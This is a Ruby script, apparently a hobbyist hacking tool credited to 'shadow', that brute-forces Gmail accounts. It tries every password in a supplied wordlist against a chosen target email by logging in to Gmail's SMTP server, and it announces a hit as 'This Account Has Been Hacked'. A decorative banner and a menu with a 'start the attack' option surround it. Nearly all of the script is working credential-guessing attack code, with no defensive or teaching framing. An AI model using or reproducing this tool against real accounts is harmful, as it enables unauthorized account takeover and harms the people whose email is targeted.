require 'openssl'
require 'base64'
require 'artii'
require 'colorize'

def login(pass_list, user_name)
  server = "smtp.gmail.com"
  port = 465
  i = 0

  pass_list.each do |password|
    i += 1
    puts "#{i}/#{pass_list.length}"

    context = OpenSSL::SSL::SSLContext.new
    socket = TCPSocket.new(server, port)
    ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, context)
    ssl_socket.connect

    if ssl_socket.gets.chomp == "220"
      ssl_socket.puts "EHLO"
      if ssl_socket.gets.chomp == "250"
        ssl_socket.puts "AUTH LOGIN"
        if ssl_socket.gets.chomp == "334"
          ssl_socket.puts Base64.strict_encode64(user_name)
          if ssl_socket.gets.chomp == "334"
            ssl_socket.puts Base64.strict_encode64(password)
            if ssl_socket.gets.chomp == "235"
              puts ""
              puts "[+] This Account Has Been Hacked Password : #{password}     ^_^"
              ssl_socket.close
              break
            end
          end
        end
      end
    end

    ssl_socket.close
    puts "[!] password not found => #{password}"
  end
end

system("clear")
def main
  artii = Artii::Base.new(font: 'ogre')
  ascii_text = artii.asciify('Bruteforce')
puts ascii_text
  puts "=================================================".colorize(:red)
  puts "                create by shadow                  ".colorize(:red)
  puts "=================================================".colorize(:blue)
  puts "                     ++++++++++++++++++++          "
  puts ""
  
  puts "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣤⣶⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⡒⣂⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡞⡳⡏⣳⣶⡫⡷⢗⡦⣄⠀⠀⠀⠀⠀⠀⠀⠀⣤⢖⣛⣅⣗⣦⡠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣙⠽⢼⣶⡣⢽⢧⡧⣳⣟⡷⢶⣦⣀⠀⠀⣠⣾⣱⣭⣧⣟⢷⡟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠑⣄⠍⡘⣒⣓⠾⢱⣢⢼⣝⣾⣏⡿⢏⣕⣎⣭⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠢⠼⣀⣭⢱⡃⠜⣼⣾⣿⢹⣻⣿⢿⠝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢺⢟⡗⠴⣾⠙⠕⣾⠟⣤⢕⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢠⡤⠴⠒⢶⣖⣶⣶⡲⠶⡢⣢⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡐⡡⢤⡫⣲⡧⠦⣃⡯⣷⣧⢛⢺⡑⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣶⣚⣯⡷⠟⠩⡿⠯⠿⠿⠾⠛⠓⣛⢯⣥⡷⣮⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⠄⣾⢞⣷⢻⡧⣟⠯⢙⡊⠄⠳⡗⡧⢳⣱⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡻⡿⣏⡟⢭⣞⠼⡫⠾⠗⠹⠹⠍⠋⠸⠇⡟⡿⣷⡷⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣞⠥⣫⣋⡩⢖⢻⣾⠖⠛⠁⠀⠀⠀⠓⡍⡻⣓⣊⢇⠀⠀⠀⠀⠀⠀⠀⠀⡔⡞⣟⣷⢗⡣⡘⢂⠁⠁⠐⠐⠀⠀⠀⠀⠀⠀⠀⠈⠋⢽⡷⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⠞⡑⠿⣶⡭⠵⠓⠙⠀⠀⠀⠀⠀⠀⠀⠀⢍⠶⡺⣳⢈⡆⠀⠀⠀⠀⠀⠀⠀⠈⣗⣛⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠛⡛⠛⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢖⣈⡧⢤⣇ ⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠑⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⢄⣴⡔⠚⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⢝⠵⣿⣟⣶⡚⠽⣇⣳⣲⣶⣆⠦⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠟⠻⣿⡏⣻⠏⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⡗⠱⣼⡟⡁⠀⢘⣼⡣⢚⣮⡚⠴⠎⢾⣺⣚⡻⢷⣠⢿⡵⡾⣶⡲⣲⣲⢶⣲⣲⣶⢲⣶⡴⠶⡲⣔⣖⣲⣲⣶⢶⣾⡟⡹⡺⠁⠀⠀⢻⣜⡝⠀⡐⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠳⠀⠈⠉⣅⡄⠈⢽⡷⡟⠁⠀⠀⠈⡾⢼⡽⣼⡘⣯⢟⣷⠓⢝⣽⣔⢨⡼⣷⣏⡸⣥⢷⣽⣇⣛⣡⡿⢿⣿⢵⣿⠿⣿⣭⠇⠀⣠⠀⠼⠁⠀⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠑⣤⣶⡋⡇⠀⠘⠛⠁⠀⠠⡀⠀⠘⣧⠯⡺⣿⡫⠊⠹⡶⡸⣇⡿⢍⡿⢹⣔⡻⣟⠋⠳⡾⡿⢻⠃⠀⣻⡿⠃⠀⠥⡟⠀⢠⣾⡧⠀⣠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠨⡼⡎⢷⠄⠀⠀⠀⠠⣚⡂⠀⠀⠸⡟⠛⠁⠀⠀⠀⠀⠉⠿⡽⠿⠁⠀⠹⡟⠃⠀⠀⠙⠏⣿⠀⠀⠈⠁⠀⠀⠈⠀⠀⣜⣿⡭⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢭⡞⣇⠀⢀⠲⡚⡵⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠁⠀⠀⠀⡟⠵⢦⠄⠀⠀⡻⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⡸⡻⡗⣿⡇⠀⠀⢀⡦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⢰⣲⠻⣊⡿⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⢍⡍⠭⡇⠀⣤⠟⣿⣇⠀⠀⠀⠀⡄⣤⡀⠀⠀⠀⠀⠀⡤⣤⠀⠀⢬⣞⣅⣀⡀⢿⡮⠜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀⠙⠻⠧⣼⣫⠩⣥⣃⠄⠀⠄⡠⡊⣹⠇⠀⠀⠀⠀⢐⣰⣧⠄⢰⢹⡺⡐⠷⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⠽⣮⠏⠄⢀⡎⡿⣅⡿⡮⠀⠀⢠⣾⣷⢷⢊⣆⢏⡻⠺⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠺⠭⢌⡢⡫⠿⠦⠀⣧⣿⡼⡼⠷⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
.colorize(:red)
end

main

puts "[1] start the attack"
.colorize(:red)
puts "[2] exit"
.colorize(:cafe)
option = gets.chomp.to_i

if option == 1
  puts "path of passwords file :"
  file_path = gets.chomp
  pass_list = File.readlines(file_path).map(&:chomp)
  puts "target email :"
  user_name = gets.chomp
  login(pass_list, user_name)
else
  exit
end
